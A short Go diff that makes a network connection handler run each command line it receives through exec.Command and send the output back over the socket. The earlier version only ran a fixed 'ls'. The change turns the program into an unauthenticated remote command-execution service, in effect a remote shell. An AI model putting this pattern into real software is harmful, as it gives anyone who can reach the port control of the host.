@@ -68,19 +68,20 @@ func handleConnection(conn net.Conn){
 		}
 		command = command+string(buf[0:n])
 		if strings.HasSuffix(command,"\n"){
-			exe_command(strings.TrimRight(command,"\r"))
+			output := exe_command(strings.TrimRight(command,"\r\n"))
+			n, err = conn.Write([]byte(output))
 			command = ""
 		}
 	}
 }
 
 func exe_command(comm string) string{
-	out, err := exec.Command("ls","").Output()
-	if err != nil{ log.Fatal(err) }
+	out, err := exec.Command(comm).CombinedOutput()
+	if err != nil{ 
+		fmt.Println(err) 
+	}
 	return string(out)
 }
-
-
 
 func start_client(){
 	fmt.Println("Starting client")
